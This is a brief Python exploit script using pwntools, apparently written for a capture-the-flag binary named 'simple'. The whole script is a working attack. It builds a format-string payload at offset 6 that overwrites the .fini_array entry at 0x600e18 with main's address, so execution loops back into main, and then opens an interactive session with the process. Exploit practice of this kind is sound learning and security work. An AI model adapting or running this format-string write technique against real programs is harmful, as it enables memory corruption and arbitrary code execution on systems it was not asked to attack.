from pwn import*
#from libformatstr import *
context.log_level='debug'
s=process(['simple'],env={"LD_PRELOAD":""})
offset = 6
fini = 0x600e18
main = 0x4006a6

#p = FormatStr()
#p[fini] = main
#pay = p.payload(6)
payload = fmtstr_payload(6,{0x600e18:0x4006a6})
raw_input()
s.send(payload)
s.interactive()
